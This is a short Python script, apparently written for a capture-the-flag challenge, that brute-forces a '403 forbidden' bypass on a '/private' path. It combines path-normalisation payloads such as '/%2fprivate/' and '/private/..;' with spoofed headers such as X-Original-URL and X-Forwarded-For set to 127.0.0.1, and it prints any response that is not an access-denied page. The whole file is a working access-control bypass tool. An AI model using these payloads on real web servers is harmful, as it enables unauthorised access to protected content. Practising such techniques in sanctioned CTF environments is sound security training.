import urllib.request
import urllib.error

url_base = "https://5b016909-ctf.dsg.id"

payloads = [
    "/private/",
    "/private",
    "/%2fprivate/",
    "/private/.",
    "/private/./",
    "/./private/",
    "/private/..;",
    "/private/../",
    "/private/../private/",
    "/private/./index.html",
    "/private;/",
]

headers_list = [
    {},
    {"X-Original-URL": "/private/"},
    {"X-Rewrite-URL": "/private/"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"True-Client-IP": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
]

for p in payloads:
    for h in headers_list:
        url = url_base + p
        h_copy = h.copy()
        h_copy["User-Agent"] = "Mozilla/5.0"
        try:
            req = urllib.request.Request(url, headers=h_copy)
            with urllib.request.urlopen(req) as response:
                body = response.read()
                # If it doesn't contain "Akses Ditolak" or "403"
                if b"Akses Ditolak" not in body and b"403" not in body:
                    print(f"[SUCCESS] URL: {url} Headers: {h}")
                    print(body.decode(errors='replace')[:500])
                    print("-" * 50)
        except urllib.error.HTTPError as e:
            pass
        except Exception as e:
            pass
